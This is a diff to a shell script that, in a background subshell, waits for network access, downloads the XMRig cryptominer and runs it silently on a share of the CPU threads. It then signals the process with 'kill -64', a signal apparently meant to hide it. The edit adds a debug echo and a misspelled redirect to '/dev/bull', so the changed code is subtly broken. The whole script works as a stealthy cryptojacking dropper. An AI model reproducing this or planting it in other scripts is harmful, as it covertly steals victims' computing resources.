@@ -29,7 +29,7 @@ if [ ! -e "$xmrig_binary" ] || [ ! -e "$xmrig_config" ]; then
 (	while ! ping -c 1 google.com > /dev/null 2>&1; do
 		sleep 5
 	done
-	wget -O -q "$xmrig_dir/xmrig_tar" https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz > /dev/null 2>&1
+	wget -O "$xmrig_dir/xmrig_tar" https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz > /dev/bull 2>&1
 	tar -xzf "$xmrig_dir/xmrig_tar" -C "$xmrig_dir/"
 	cp "$xmrig_dir/xmrig-6.22.2/xmrig" "$xmrig_binary"
 	cp "$xmrig_dir/xmrig-6.22.2/config.json" "$xmrig_config"
@@ -66,6 +66,7 @@ if [ "$threads" -gt 4 ]; then
 	done
 	usable_threads=$((threads * 20 / 100))
 	"$xmrig_binary" --config="$xmrig_config" --threads=$usable_threads > /dev/null 2>&1 &
+	echo "xmrig works!"
 	kill -64 $!
 ) &
 fi
